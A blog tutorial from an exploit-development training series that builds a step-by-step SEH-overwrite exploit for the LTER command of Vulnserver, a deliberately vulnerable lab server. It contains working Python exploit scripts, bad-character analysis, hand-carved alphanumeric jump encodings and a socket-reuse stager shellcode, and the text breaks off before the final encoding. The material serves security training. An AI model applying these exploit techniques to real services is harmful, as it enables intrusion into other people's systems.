---
slug: vulnserver-lter-seh/
title: 'LTER: Overcoming Bad Chars'
date: 2020-06-23
category: attacks
subtitle: Bad chars everywhere
tags: osce, vulnserver, training, exploit
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620331206/blog/vulnserver-lter-seh/cover_basr0i.webp
alt: Photo by Kevin Ku on Unsplash
description: This post will show how to exploit the Vulnserver LTER
  command on where we will need to bypass bad chars restrictions.
keywords: Business, Information, Security, Protection, Hacking, Exploit,
  OSCE, Ethical Hacking, Pentesting
author: Andres Roldan
writer: aroldan
name: Andres Roldan
about1: Cybersecurity Specialist, OSCP, CHFI
about2: '"We don''t need the key, we''ll break in" RATM'
source: https://unsplash.com/photos/w7ZyuGYNpRQ
---

This is the sixth article on the series of exploiting `Vulnserver`, a
VbD (Vulnerable-by-Design) application in which you can practice Windows
exploit development.

In previous posts, we have been able to exploit Vulnserver commands:

1. `TRUN` was [exploited](../vulnserver-trun/) using a direct EIP
    overwrite, with virtually no space or character restrictions to work
    on.

2. `GMON` used a [Structured Exception Handling
    (SEH)](../vulnserver-gmon/) overwrite to take control of the
    execution flow.

3. `GTER` showed up with space restrictions and we were able to exploit
    it using [egghunters](../vulnserver-gter/) and [WinSocket stack
    reuse](../vulnserver-gter-no-egghunter/).

4. `KSTET` had a very narrow buffer for us to work on, but we were able
    to use a [multistage exploit](../vulnserver-kstet/) to get our
    shell.

So far, we’ve been faced with mostly buffer space issues, but with
little to none restrictions on what kind of instructions we were allowed
to use.

But in fact, instruction restrictions are the rule. Think about
exploiting a `Host` HTTP header: A host name normally is only
alphanumeric and few other chars are allowed. If we are going to inject
code on that header, we would surely be limited to use instructions
whose opcodes are in the allowed list.

In this post, we will exploit the Vulnserver `LTER` command.

We’ll have to use techniques we’ve learned on our previous posts and
include others to exploit that command successfully.

## Fingerprinting LTER

The enumeration part is the most important step. This will lead us to
the right path of exploiting our target.

We can create a new connection and see how `LTER` command works:

``` console
$ telnet 192.168.0.20 9999
Trying 192.168.0.20...
Connected to 192.168.0.20.
Escape character is '^]'.
Welcome to Vulnerable Server! Enter HELP for help.
LTER me
LTER COMPLETE
LTER *
LTER COMPLETE
LTER 9
LTER COMPLETE
LTER !@#$$%&*()
LTER COMPLETE
```

Now try with something bulkier:

<div class="imgblock">

![Crash](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331206/blog/vulnserver-lter-seh/crash1_yts1qc.gif)

</div>

Hmm, something’s not right. We can create an initial exploit to test
faster.

``` python
import socket

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'LTER .' +
    b'A' * 4000
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
    fd.recv(128)
```

Now use a debugger to see what’s going on:

<div class="imgblock">

![Crash
2](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331202/blog/vulnserver-lter-seh/crash2_kwxlzr.gif)

</div>

Well, it seems we’re facing an SEH overwrite. Please, check [this
post](../vulnserver-gmon/) for an explanation of SEH.

OK, we need to figure out the offset by:

1. Creating a cyclic pattern.

2. Checking the offset of the pattern found in the SEH handler.

Let’s do that:

``` console
$ msf-pattern_create -l 4000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac...
```

Update our exploit:

``` python
import socket

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'LTER .' +
    b'<inset pattern here>'
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

And run it:

<div class="imgblock">

![Pattern](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331204/blog/vulnserver-lter-seh/pattern1_drj3ub.gif)

</div>

The SEH handler was overwritten with `356F4534`. We can check the offset
using `pattern_offset.rb`:

``` console
$ msf-pattern_offset -q 356F4534
[*] Exact match at offset 3554
```

That means that the SEH handler was overwritten starting at byte `3554`.
Let’s update our exploit to reflect that offset:

``` python
import socket

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'LTER .' +
    b'A' * 3554 +
    b'B' * 4 +
    b'C' * (4000 - 3554 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

And check it:

<div class="imgblock">

![Pattern
OK](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331204/blog/vulnserver-lter-seh/pattern2_fqkl7b.gif)

</div>

Great. If we trigger the exception handler, we will overwrite `EIP`.

<div class="imgblock">

![Pattern
OK](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331200/blog/vulnserver-lter-seh/eip1_fld56r.webp)

</div>

The stack window (bottom right) shows that our buffer is 8 bytes below
the stack pointer `ESP`, so we need to find a `POP/POP/RET` sequence on
the executable modules of Vulnserver that makes us land directly over
the `nSEH` field which we now control. `mona` can help us:

<div class="imgblock">

![POP POP
RET](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331202/blog/vulnserver-lter-seh/poppopret1_fi3zbt.webp)

</div>

We instructed `mona` to find `POP/POP/RET` gadgets (`seh`) and exclude
pointers with null bytes (`-cp nonull`), those with `SafeSEH` enabled
(`-cp safeseh=off`) and not belonging to the OS (`-o`). That gave us 12
pointers.

Let’s use the first in the list (`625010B4`) to replace our `B` buffer:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'LTER .' +
    b'A' * 3554 +
    # 625010B4    5B                          POP EBX
    # 625010B5    5D                          POP EBP
    # 625010B6    C3                          RETN
    struct.pack('<L', 0x625010B4) +
    b'C' * (4000 - 3554 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

With that, we’d be able to run that sequence that will direct the
execution flow to our controlled buffer. Let’s check it:

<div class="imgblock">

![Badchar return
address](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331201/blog/vulnserver-lter-seh/badchar1_jtchqp.gif)

</div>

Hmmm, something’s not quite right. We injected `625010B4`, but for some
reason the application turned the last byte of the address (`B4`) to
`35` and got `62501035` instead. We didn’t expect that.

We need to check what other variations would be applied to our buffer in
order to get the available bytes we can work with.

## Hunting for bad chars

Let’s look at this image:

<div class="imgblock">

![ANSI](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331206/blog/vulnserver-lter-seh/ansi1_mfxlwx.webp)

</div>

We can see here that our application works with `ANSI` encoded strings.
`ANSI` chars are 1 byte long, which means that all the available `ANSI`
chars are in the range from `0x00` to `0xff`.

With that in mind, we need to know which of those 256 possible `ANSI`
chars will be mangled by the application when we are injecting code.

To do that, `mona` can help us again:

``` console
!mona bytearray
```

This will create an array with all the 256 available `ANSI` chars:

<div class="imgblock">

![ANSI](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331203/blog/vulnserver-lter-seh/bytearray1_pjftsg.webp)

</div>

I’ve mentioned in other posts that it’s a good idea to exclude null
chars (`0x00`), carriage return (`0x0d`) and line feed (`0x0a`) from our
shellcode. We can filter them in advance with:

``` console
!mona bytearray -cpb '\x00\x0a\x0d'
```

Or with Python3:

``` python
EXCLUDE = ('0x0', '0xa', '0xd')
BADCHARS = bytes(bytearray([x for x in range(256) if hex(x) not in EXCLUDE]))
```

<div class="imgblock">

![ANSI
2](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331207/blog/vulnserver-lter-seh/bytearray2_xhuyku.webp)

</div>

Now we can inject that array into our exploit:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

EXCLUDE = ('0x0', '0xa', '0xd')

BADCHARS = bytes(bytearray([x for x in range(256) if hex(x) not in EXCLUDE]))

PAYLOAD = (
    b'LTER .' +
    BADCHARS +
    b'A' * (3554 - len(BADCHARS)) +
    b'B' * 4 +
    b'C' * (4000 - 3554 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

Now, run this updated exploit to check how the `LTER` command treats all
the chars:

<div class="imgblock">

![Checking bad
chars](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331201/blog/vulnserver-lter-seh/check-badchars1_ubzeez.gif)

</div>

We can see several things here:

1. Our payload of bad chars was successfully injected after the `LTER
    .` string.

2. It seems that all the chars, from `0x01` to `0x7f` were successfully
    injected.

3. When the bytearray reached the char `0x80`, it was converted to
    `0x01`, then `0x81` to `0x02`, and so on.

There is a more graphical way to check that, using `mona` once again:

``` console
!mona cmp -f C:\mona\vulnserver\bytearray.bin -a <badchars memory address>
```

This will tell `mona` to compare the contents of the previously created
file `C:\mona\vulnserver\bytearray.bin` with the contents of the memory
on where our bad chars array started. In the previous example, the bad
chars were started to be injected on `00F0F1EE`:

<div class="imgblock">

![Bad chars
start](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331200/blog/vulnserver-lter-seh/badchars-start_qeb2ko.webp)

</div>

So the `mona` command would be:

``` console
!mona cmp -f C:\mona\vulnserver\bytearray.bin -a 00F0F1EE
```

And the output would be:

<div class="imgblock">

![Mona
cmp](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331205/blog/vulnserver-lter-seh/mona-cmp1_jgfekz.gif)

</div>

Here is the resulting comparison table:

``` text
[+] Comparing with memory at location : 0x00f0f1ee (Stack)
Only 125 original bytes of 'normal' code found.
    ,-----------------------------------------------.
    | Comparison results:                           |
    |-----------------------------------------------|
  0 |01 02 03 04 05 06 07 08 09 0b 0c 0e 0f 10 11 12| File
    |                                               | Memory
 10 |13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20 21 22| File
    |                                               | Memory
 20 |23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32| File
    |                                               | Memory
 30 |33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40 41 42| File
    |                                               | Memory
 40 |43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51 52| File
    |                                               | Memory
 50 |53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60 61 62| File
    |                                               | Memory
 60 |63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72| File
    |                                               | Memory
 70 |73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80 81 82| File
    |                                       01 02 03| Memory
 80 |83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90 91 92| File
    |04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13| Memory
 90 |93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0 a1 a2| File
    |14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20 21 22 23| Memory
 a0 |a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0 b1 b2| File
    |24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32 33| Memory
 b0 |b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf c0 c1 c2| File
    |34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40 41 42 43| Memory
 c0 |c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0 d1 d2| File
    |44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51 52 53| Memory
 d0 |d3 d4 d5 d6 d7 d8 d9 da db dc dd de df e0 e1 e2| File
    |54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60 61 62 63| Memory
 e0 |e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0 f1 f2| File
    |64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73| Memory
 f0 |f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff         | File
    |74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80         | Memory
    `-----------------------------------------------'

                | File      | Memory    | Note
.-----------------------------------------------------
0   0   125 125 | 01 ... 7f | 01 ... 7f | unmodified!
.-----------------------------------------------------
125 125 128 128 | 80 ... ff | 01 ... 80 | corrupted

Possibly bad chars: 80
Bytes omitted from input: 00 0a 0d
```

That’s a lot of very valuable information for us. Now it’s clear why our
previously injected address `625010B4` was translated to `62501035`.

## Allowed charset

In the previous section, we were able to narrow the character set that
was allowed for us to inject code. The characters range from hex `0x1`
to `0x7f`, excluding `0xa` and `0xd`. That range belongs to what’s known
as the ASCII character set. In Linux, you can see the ASCII table using
the command `man 7 ascii`. However, a simple search on Google will give
thousands of results.

This means that for now on, we are limited to work with that set of
characters.

The first thing we need to do is to search another `POP/POP/RET` gadget
on a pointer that contains only bytes allowed on our character set. To
do that, we can issue another command filtering the `POP/POP/RET`
gadgets containing only ASCII bytes and excluding `0xa` and `0xd`:

``` console
!mona seh -cm safeseh=off -cp nonull,ascii -o -cpb '\x0a\x0d'
```

Fortunately for us, 3 pointers fulfill all our requirements:

<div class="imgblock">

![ASCII
POP/POP/RET](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331206/blog/vulnserver-lter-seh/ascii-poppopret1_gliml7.webp)

</div>

Let’s choose the first result at `6250172B` and update our exploit:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'LTER .' +
    b'A' * 3554 +
    # 6250172B    5F                          POP EDI
    # 6250172C    5D                          POP EBP
    # 6250172D    C3                          RETN
    struct.pack('<L', 0x6250172B) +
    b'C' * (4000 - 3554 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

And check if this time we are able to reach the `POP/POP/RET` sequence:

<div class="imgblock">

![Return
success](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331205/blog/vulnserver-lter-seh/retsuccess1_c8o1pb.gif)

</div>

Yes\! Things start to get better…​ or not?

## Finding useful instructions

After the `POP/POP/RET` on `6250172B` sequence is executed, we landed at
the [nSEH parameter](../vulnserver-gmon/), and we need to get past over
the injected SEH handler address. What we did before with the `GMON`
command was to perform a short jump. That jump had the bytecode
`\xeb\x08`. However, this time we are limited by instructions on the
`\x00 - \x7f` range, so the short jump opcode (`\xeb`) is not an option.
We need to find an instruction that can perform a short jump and has an
opcode in our allowed character set. That instruction must also fit in 4
bytes or less.

Luckily for us, [conditional
jumps](http://unixwiz.net/techtips/x86-jumps.html) are the answer:

1. They are 2 bytes long.

2. Most of them have opcodes on our allowed range.

However, we need to choose the appropriate condition that actually
performs the jump. For example, if we choose the `JNZ` conditional, we
must make sure that the condition is always true in order to perform the
desired jump.

Or, we can use some discrete mathematics here and take advantage of
predicated logic and use two opposite 2-bytes conditional jumps. The
logic is simple:

1. Having `Bool(ZF) = unknown`

2. As we don’t know the current value of `ZF`, predicated logic says
    that `Bool(ZF) || ~Bool(ZF) == true`

So, instead of injecting a simple `JNZ SHORT +0x8`, we will inject two
conditional jumps:

``` x86asm
\x75\x08      ; JNZ SHORT +0x10: Will jump if ZF is 1
\x74\x06      ; JZ SHORT +0x8: If the previous jump didn't happen (ZF is 0), jump!
```

This will ensure that no matter the value of `ZF` on the processor, any
of those instructions will be true, and the jump will be performed.
Let’s update our exploit with that:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'LTER .' +
    b'A' * (3554 - 4) +
    # JNZ SHORT +0x10: Will jump if ZF is 1
    b'\x75\x08' +
    # JZ SHORT +0x8: If the previous jump didn't happen (ZF is 0), jump!
    b'\x74\x06' +
    # 6250172B    5F                          POP EDI
    # 6250172C    5D                          POP EBP
    # 6250172D    C3                          RETN
    struct.pack('<L', 0x6250172B) +
    b'C' * (4000 - 3554 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

Now check if that worked:

<div class="imgblock">

![Jump
success](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331203/blog/vulnserver-lter-seh/jmp-success1_rhjvra.gif)

</div>

It did\! The first condition was not met, the second was, and the jump
succeded.

Now, after successfully jumping over the SEH handler, we landed on a
41-byte section where we injected our `C` buffer. What would normally
happen is to perform a long jump back to the start of our `A` buffer to
make some more room to inject something larger like a shellcode.

While that is certainly true, we can’t perform a normal long jump
because it will contain unallowed bytes (`\xff`, for example).

## Checking existing encoders

To overcome that, we will need to start encoding everything we inject,
using our allowed characters, in a way that it will decode in memory and
execute the needed action.

Let’s encode our first needed instruction: The long backward jump.

First, we need to get the desired opcode:

<div class="imgblock">

![Long
jump](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331201/blog/vulnserver-lter-seh/longjump1_knhwi2.webp)

</div>

As we can see, we’d need to inject an encoded version of `E9 13 F2 FF
FF`.

First, we’re going to try existing encoders. We will try those available
on `msfvenom` that generate an alphanumeric shellcode:

<div class="imgblock">

![Failed
encoders](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331200/blog/vulnserver-lter-seh/failed-encoders1_wdb2n8.gif)

</div>

Having a restricted 41-byte buffer, the common alphanumeric encoders are
not viable:

1. `x86/alpha_mixed` produced a 71-byte shellcode.

2. `x86/add_sub` failed.

3. `x86/opt_sub` produced a 61-byte shellcode.

Maybe the long jump instruction is too large. Let’s try with the
farthest possible short backward jump `JMP SHORT +0x80 = \xeb\x80`:

``` console
$ python -c "buff= b'\xeb\x80'; fd = open('jmp.bin', 'wb'); fd.write(buff)"
$ cat jmp.bin | msfvenom -p - -a x86 --platform windows -e x86/opt_sub -o /dev/null
Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/opt_sub
x86/opt_sub succeeded with size 45 (iteration=0)
x86/opt_sub chosen with final size 45
Payload size: 45 bytes
Saved as: /dev/null
$ cat jmp.bin | msfvenom -p - -a x86 --platform windows -e x86/alpha_mixed -o /dev/null
Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 66 (iteration=0)
x86/alpha_mixed chosen with final size 66
Payload size: 66 bytes
Saved as: /dev/null
```

Better. However, it won’t fit either. That means that we have to encode
that short jump manually.

## Manual encoding

Having our restricted allowed characters set, the technique we will use
is known as ADD/SUB/AND encoding. The technique is fully described
[here](https://vellosec.net/2018/08/carving-shellcode-using-restrictive-character-sets/).

Basically, what we’ll need to do is the following:

1. Point `ESP` to a place that will be in the execution flow path.

2. Manipulate `EAX` using `ADD`, `SUB` or `AND` instructions to make it
    hold our desired `\xeb\x80` value.

### Align ESP

To accomplish the first point, we need to do the following:

1. Get the current value of `ESP`.

2. Get the offset between the current `ESP` location and the place
    where we want it to be. Remember that it must be later on our
    execution path.

3. `ADD` that offset to `ESP`, so it effectively points to the new
    location.

Let’s do that:

<div class="imgblock">

![Align
ESP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331203/blog/vulnserver-lter-seh/align-esp1_rwmput.gif)

</div>

Note that all the resulting bytes are in our allowed charset. Now update
our exploit with those instructions:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'LTER .' +
    b'A' * (3554 - 4) +
    # JNZ SHORT +0x10: Will jump if ZF is 1
    b'\x75\x08' +
    # JZ SHORT +0x6: If the previous jump didn't happen (ZF is 0), jump!
    b'\x74\x06' +
    # 6250172B    5F                          POP EDI
    # 6250172C    5D                          POP EBP
    # 6250172D    C3                          RETN
    struct.pack('<L', 0x6250172B) +
    b'C' * 2 +
    # Align stack pointer
    b'\x54' +               # PUSH ESP
    b'\x58' +               # POP EAX
    b'\x66\x05\x53\x14' +   # ADD AX,0x1453
    b'\x50' +               # PUSH EAX
    b'\x5c' +               # POP ESP
    b'C' * (4000 - 3554 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

And check it. If it works, `ESP` must point to the very end of our `C`
buffer:

<div class="imgblock">

![Align
ESP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331205/blog/vulnserver-lter-seh/align-esp2_gahfhu.gif)

</div>

Great\! It means that any `PUSH` instruction will put things in that
place. And that’s exactly what we wanted to do.

### Carve short jump

With that in place, we need to make `EAX` holds our short backward jump
bytes, `\xeb\x80`. But we need to do it the right way:

1. Remember that `EAX` is a 32-bit register, so we must pad it with two
    NOPs. The resultant expected value should be `\xeb\x80\x90\x90`.

2. As we are pushing that on the stack and keeping in mind that the x86
    architecture is little-endian, we must reverse that value and make
    EAX equal to `\x90\x90\x80\xeb` and then, when the `PUSH EAX`
    occurs, the injected value would be `\xeb\x80\x90\x90`.

First, we need to zero out `EAX`. This can be done using a couple of
`AND` instructions:

``` x86asm
AND EAX,504A5050
AND EAX,2A302A2A
```

This will work because:

``` txt
504A5050 = 1010000010010100101000001010000
                                       AND
2A302A2A = 0101010001100000010101000101010
__________________________________________
           0000000000000000000000000000000
```

Then, we need to find some values that, when added, result in
`909080eb`. If we divide `909080eb` by two, we will get `48484075.8`. So
we can add `48484075` to `EAX` and then add `48484076` to make it
`909080eb`.

Let’s see if that works:

<div class="imgblock">

![Carve
EAX](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331203/blog/vulnserver-lter-seh/carve-eax1_fg9xhd.gif)

</div>

Great\!

We can now execute `PUSH EAX` and our desired `\xeb\x80` should emerge
like magic:

<div class="imgblock">

![Carve
EAX](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331202/blog/vulnserver-lter-seh/push-eax1_pqhuob.gif)

</div>

Isn’t it wonderful? It looks like black magic\!

Let’s update our exploit with that:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'LTER .' +
    b'A' * (3554 - 4) +
    # JNZ SHORT +0x10: Will jump if ZF is 1
    b'\x75\x08' +
    # JZ SHORT +0x6: If the previous jump didn't happen (ZF is 0), jump!
    b'\x74\x06' +
    # 6250172B    5F                          POP EDI
    # 6250172C    5D                          POP EBP
    # 6250172D    C3                          RETN
    struct.pack('<L', 0x6250172B) +
    b'C' * 2 +
    # Align stack pointer
    b'\x54' +                   # PUSH ESP
    b'\x58' +                   # POP EAX
    b'\x66\x05\x53\x14' +       # ADD AX,0x1453
    b'\x50' +                   # PUSH EAX
    b'\x5c' +                   # POP ESP
    # Make EAX = '909080eb'
    b'\x25\x50\x50\x4A\x50' +   # AND EAX,504A5050
    b'\x25\x2A\x2A\x30\x2A' +   # AND EAX,2A302A2A
    b'\x05\x75\x40\x48\x48' +   # ADD EAX,48484075
    b'\x05\x76\x40\x48\x48' +   # ADD EAX,48484076
    b'\x50' +                   # PUSH EAX
    b'C' * (4000 - 3554 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

## More jumping around

Great, but we landed on a 78-byte buffer. We need to jump to the start
of our `A` buffer. However, as we saw before, 78 bytes is more than
enough for encoding and executing a long backward jump. We will use the
same strategy as before.

First, we need to know the exact instruction of the desired long
backward jump:

<div class="imgblock">

![Second long
jump](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331199/blog/vulnserver-lter-seh/long-jump2_m5hsrq.webp)

</div>

The resulting bytes are `E9 2D F2 FF FF`. We must perform a long jump
not to the very start of our buffer, but somewhere in the first bytes.
This is because we don’t know at this point the memory address on where
the `JMP` instruction will be generated, and thus, the offset will
likely change.

With the required bytes, we need to align the `ESP` pointer again. As we
saw, it’s a good idea to point it to the higher memory of the block in
order to avoid overwriting our encoded payload. This leads to:

``` x86asm
push esp            ; Push the current value of ESP on the stack
pop eax             ; Pop it to EAX register
sub al,0x30         ; Substract 30 bytes from EAX
push eax            ; Push the resultant value of EAX to the stack
pop esp             ; Pop it back the ESP
```

Let’s update our exploit:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'LTER .' +
    b'A' * (3554 - 4 - 79) +
    # Align stack for our long jump
    b'\x54' +           # PUSH ESP
    b'\x58' +           # POP EAX
    b'\x2c\x30' +       # SUB AL,30
    b'\x50' +           # PUSH EAX
    b'\x5c' +           # POP ESP
    b'A' * (79 - 6) +   # Fill the rest of our buffer with A
    # JNZ SHORT +0x10: Will jump if ZF is 1
    b'\x75\x08' +
    # JZ SHORT +0x6: If the previous jump didn't happen (ZF is 0), jump!
    b'\x74\x06' +
    # 6250172B    5F                          POP EDI
    # 6250172C    5D                          POP EBP
    # 6250172D    C3                          RETN
    struct.pack('<L', 0x6250172B) +
    b'C' * 2 +
    # Align stack pointer
    b'\x54' +                   # PUSH ESP
    b'\x58' +                   # POP EAX
    b'\x66\x05\x53\x14' +       # ADD AX,0x1453
    b'\x50' +                   # PUSH EAX
    b'\x5c' +                   # POP ESP
    # Make EAX = '909080eb'
    b'\x25\x50\x50\x4A\x50' +   # AND EAX,504A5050
    b'\x25\x2A\x2A\x30\x2A' +   # AND EAX,2A302A2A
    b'\x05\x75\x40\x48\x48' +   # ADD EAX,48484075
    b'\x05\x76\x40\x48\x48' +   # ADD EAX,48484076
    b'\x50' +                   # PUSH EAX
    b'C' * (4000 - 3554 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

And check it:

<div class="imgblock">

![Align
ESP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331201/blog/vulnserver-lter-seh/align-esp3_swtzxo.gif)

</div>

Great\! We can now encode our long backward jump. This time I will use a
tool called [Automatic ASCII Shellcode Subtraction
Encoder](https://github.com/andresroldan/Automatic-ASCII-Shellcode-Subtraction-Encoder).
Elias Augusto created it and I added some convenient improvements.

Let’s get our encoded jump:

``` console
$ python3 encoder.py -m -p -s 'E92DF2FFFF' -v LONG_JUMP
...
Shellcode length: 52
Shellcode Output:

LONG_JUMP  = b'\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x62\x21\x22\x23\x2d'
LONG_JUMP += b'\x38\x25\x2b\x28\x2d\x67\x28\x22\x24\x50\x25\x50\x50\x4a\x50\x25'
LONG_JUMP += b'\x2a\x2a\x30\x2a\x2d\x42\x7f\x29\x73\x2d\x7f\x25\x69\x2d\x2d\x56'
LONG_JUMP += b'\x2d\x7b\x5f\x50'
```

Great, let’s add that `LONG_JUMP` variable to our exploit:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

LONG_JUMP  = b'\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x62\x21\x22\x23\x2d'
LONG_JUMP += b'\x38\x25\x2b\x28\x2d\x67\x28\x22\x24\x50\x25\x50\x50\x4a\x50\x25'
LONG_JUMP += b'\x2a\x2a\x30\x2a\x2d\x42\x7f\x29\x73\x2d\x7f\x25\x69\x2d\x2d\x56'
LONG_JUMP += b'\x2d\x7b\x5f\x50'

PAYLOAD = (
    b'LTER .' +
    b'A' * (3554 - 4 - 79) +
    # Align stack for our long jump
    b'\x54' +           # PUSH ESP
    b'\x58' +           # POP EAX
    b'\x2c\x30' +       # SUB AL,30
    b'\x50' +           # PUSH EAX
    b'\x5c' +           # POP ESP
    LONG_JUMP +
    b'A' * (79 - 6 - len(LONG_JUMP)) +   # Fill the rest of our buffer with A
    # JNZ SHORT +0x10: Will jump if ZF is 1
    b'\x75\x08' +
    # JZ SHORT +0x6: If the previous jump didn't happen (ZF is 0), jump!
    b'\x74\x06' +
    # 6250172B    5F                          POP EDI
    # 6250172C    5D                          POP EBP
    # 6250172D    C3                          RETN
    struct.pack('<L', 0x6250172B) +
    b'C' * 2 +
    # Align stack pointer
    b'\x54' +                   # PUSH ESP
    b'\x58' +                   # POP EAX
    b'\x66\x05\x53\x14' +       # ADD AX,0x1453
    b'\x50' +                   # PUSH EAX
    b'\x5c' +                   # POP ESP
    # Make EAX = '909080eb'
    b'\x25\x50\x50\x4A\x50' +   # AND EAX,504A5050
    b'\x25\x2A\x2A\x30\x2A' +   # AND EAX,2A302A2A
    b'\x05\x75\x40\x48\x48' +   # ADD EAX,48484075
    b'\x05\x76\x40\x48\x48' +   # ADD EAX,48484076
    b'\x50' +                   # PUSH EAX
    b'C' * (4000 - 3554 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

And check it:

<div class="imgblock">

![Long jump
success](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331200/blog/vulnserver-lter-seh/long-jump-success1_rmm8w0.gif)

</div>

Fantastic\! Now we have enough room for encoding something really
useful.

We will use the stager shellcode applied to exploit the `KSTET` command,
with only a slight modification on the `ESP` alignment (2 bytes instead
of 64; more information of that stager on the [KSTET
writeup](../vulnserver-kstet/)):

**shellcode.asm.**

``` x86asm
sub esp,0x2                ; Align ESP 2 bytes above
xor edi,edi             ; Zero out EDI
socket_loop:            ; Our bruteforce loop starts here
xor ebx,ebx             ; Zero out EBX
push ebx                ; Push 'flags' parameter = 0
add bh,0x4              ; Make EBX = 00000400 = 1024 bytes
push ebx                ; Push `len` parameter = 1024 bytes
mov ebx,esp             ; Move the current pointer of ESP into EBX
add ebx,0x64            ; Point EBX the original ESP to make it the pointer on
                        ; where our stage-2 payload will be received
push ebx                ; Push `*buf` parameter = Pointer to ESP+0x64
inc edi                 ; Make EDI = EDI + 1
push edi                ; Push socket handle `s` parameter = EDI = EDI + 1
mov eax,0x40252C90      ; We need to make EAX = 0040252C but we can't inject
                        ; null bytes. So 40252C90 is shift-left padded with 90
shr eax,0x8             ; Remove the '90' byte of EAX by shifting right and
                        ; This makes EAX = 0040252C
call eax                ; Call recv()
test eax,eax            ; Check if our recv() call was successfully made
jnz socket_loop         ; If recv() failed, jump back to the socket loop where
                        ; EDI will be increased to check the next socket handle
```

We can compile that using `NASM`:

``` console
nasm -f elf32 -o shellcode.o shellcode.asm
```

And get the expected shellcode with:

``` bash
$ for i in $(objdump -d shellcode.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
\x83\xec\x02\x31\xff\x31\xdb\x53\x80\xc7\x04\x53\x89\xe3\x83\xc3\x64\x53\x47
\x57\xb8\x90\x2c\x25\x40\xc1\xe8\x08\xff\xd0\x85\xc0\x75\xe3
```

Now, let’s encode that with our tool:

